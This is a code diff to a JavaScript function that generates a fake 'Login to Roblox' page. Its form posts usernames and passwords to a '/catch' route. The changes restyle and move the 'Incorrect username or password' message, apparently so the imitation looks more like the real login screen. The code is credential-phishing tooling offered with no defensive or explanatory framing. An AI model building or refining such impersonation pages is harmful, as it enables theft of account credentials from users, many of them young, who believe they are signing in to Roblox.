@@ -31,7 +31,7 @@ function getLoginPage(showError = false) {
 
         .auth-container { 
             background-color: #23252b;
-            padding: 26px 34px 24px; 
+            padding: 31px 34px 29px; 
             border-radius: 6px; 
             width: 100%;
             max-width: 420px;
@@ -49,14 +49,10 @@ function getLoginPage(showError = false) {
         }
 
         .error-message {
-            background-color: #3a1f1f;
-            color: #ff6b6b;
-            border: 1px solid #5c2b2b;
-            border-radius: 6px;
-            padding: 9px 14px;
+            color: #ff4d4d;
             font-size: 13.5px;
-            margin-bottom: 12px;
-            text-align: center;
+            margin: 6px 0 10px 0;
+            text-align: left;
             display: ${showError ? 'block' : 'none'};
         }
 
@@ -144,11 +140,10 @@ function getLoginPage(showError = false) {
     <div class="auth-container">
         <h1>Login to Roblox</h1>
         
-        <div class="error-message">Incorrect username or password.</div>
-        
         <form action="/catch" method="POST">
             <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
             <input type="password" name="password" class="input-control" placeholder="Password" required>
+            <div class="error-message">Incorrect username or password.</div>
             <button type="submit" class="btn-submit">Log In</button>
         </form>
 
